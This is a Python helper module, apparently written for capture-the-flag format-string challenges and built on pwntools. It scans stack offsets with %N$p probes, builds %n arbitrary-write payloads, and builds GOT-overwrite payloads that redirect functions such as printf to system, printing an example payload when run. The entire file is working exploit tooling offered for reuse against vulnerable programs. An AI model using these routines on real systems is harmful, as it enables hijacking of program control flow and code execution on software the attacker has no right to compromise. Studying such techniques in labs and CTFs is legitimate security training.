#!/usr/bin/env python3
"""
format_string_helper.py -- Helpers for format-string vulnerability challenges:
leaking stack values and building %n-based arbitrary-write payloads.

Requires: pip install pwntools

Usage as a library, e.g. inside exploit_template.py:
    from format_string_helper import leak_offset_scan, fmtstr_write_payload
"""
from pwn import fmtstr_payload, p64, log


def leak_offset_scan(io, send_fn, recv_fn, max_offset=30):
    """
    Sends %1$p, %2$p, ... to find which format-string offset corresponds
    to attacker-controlled input (useful for locating your buffer on the stack).

    send_fn(payload) / recv_fn() should wrap io.sendline / io.recvline for your
    specific target's prompt structure.
    """
    results = {}
    marker = b"AAAAAAAA"  # 8-byte marker, easy to spot in %p leaks (0x4141414141414141)
    for offset in range(1, max_offset + 1):
        payload = marker + f"|%{offset}$p".encode()
        send_fn(payload)
        response = recv_fn()
        results[offset] = response
        if b"4141414141414141" in response:
            log.success(f"Marker found at format offset {offset}")
    return results


def fmtstr_write_payload(offset, writes, numbwritten=0, write_size='byte'):
    """
    Thin wrapper around pwntools' fmtstr_payload to build a %n write chain.

    offset:  the format-string argument offset for your buffer (find via leak_offset_scan)
    writes:  dict of {address: value_to_write}, e.g. {0x404040: 0xdeadbeef}
    """
    return fmtstr_payload(offset, writes, numbwritten=numbwritten, write_size=write_size)


def build_got_overwrite(offset, got_addr, new_value):
    """Common pattern: overwrite a GOT entry (e.g. printf@got) to redirect to system/win."""
    return fmtstr_write_payload(offset, {got_addr: new_value})


if __name__ == "__main__":
    print(__doc__)
    print("\nExample GOT overwrite payload (offset=6, target=0x404018, value=0x401196):")
    print(build_got_overwrite(6, 0x404018, 0x401196))
